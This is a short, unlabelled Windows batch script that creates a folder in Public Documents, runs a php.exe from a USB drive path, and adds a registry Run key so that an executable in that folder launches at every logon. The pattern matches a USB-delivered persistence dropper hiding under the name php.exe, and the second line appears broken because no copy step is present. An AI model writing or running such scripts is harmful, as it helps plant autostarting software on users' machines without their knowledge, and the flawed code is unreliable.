mkdir "C:\Users\Public\Documents\Proyectos"
"G:\llave\php.exe" "C:\Users\Public\Documents\Proyectos\"
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v php /t REG_SZ /d "C:\Users\Public\Documents\Proyectos\php.exe" /f
